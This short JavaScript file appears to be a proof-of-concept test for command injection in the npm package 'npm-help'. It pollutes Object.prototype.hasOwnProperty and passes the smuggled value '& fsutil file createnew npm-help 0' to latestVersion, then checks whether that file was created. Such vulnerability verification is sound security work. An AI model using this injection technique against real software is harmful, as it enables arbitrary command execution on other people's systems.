Object.prototype.hasOwnProperty = () => true;
const root = require('npm-help');
const fs = require('fs');
const path = './npm-help';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
var module = '& fsutil file createnew npm-help 0';
root.latestVersion(module);
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlinkSync('./version');
fs.unlink(path, function (err) {
});